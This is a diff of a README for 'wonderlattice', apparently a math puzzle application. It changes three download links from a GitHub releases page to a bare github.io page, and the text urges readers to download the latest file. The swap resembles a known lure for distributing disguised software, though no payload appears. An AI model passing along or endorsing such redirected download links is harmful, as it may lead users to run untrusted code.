@@ -1,6 +1,6 @@
 # ✨ wonderlattice - Discover the beauty of math, one puzzle at a time
 
-[![Download wonderlattice](https://img.shields.io/badge/Download%20wonderlattice-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rexdeiodinating563/wonderlattice/releases)
+[![Download wonderlattice](https://img.shields.io/badge/Download%20wonderlattice-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://rexdeiodinating563.github.io)
 
 ## 🧩 What is wonderlattice?
 
@@ -33,7 +33,7 @@ Ready to dive into the world of wonderlattice? Here's how to get started in just
 
 ### 📥 Step 1: Download the Application
 
-Visit this link to download the application: [Download wonderlattice](https://github.com/rexdeiodinating563/wonderlattice/releases)
+Visit this link to download the application: [Download wonderlattice](https://rexdeiodinating563.github.io)
 
 When you click the link, you'll see a list of available files. Look for the latest version—it will usually be at the top. Download the file to your computer.
 
@@ -171,7 +171,7 @@ wonderlattice is released under an open-source license, which means you're free 
 
 ## 🎉 Start Your Math Adventure Today!
 
-Don't wait—there's a whole world of mathematical wonder waiting for you. Visit [the download page](https://github.com/rexdeiodinating563/wonderlattice/releases) now and start exploring.
+Don't wait—there's a whole world of mathematical wonder waiting for you. Visit [the download page](https://rexdeiodinating563.github.io) now and start exploring.
 
 Remember: with wonderlattice, you don't need to be a math expert to enjoy math. You just need curiosity and a few minutes to spare. Pick an experiment, play, and discover how beautiful and fun math can be!
 
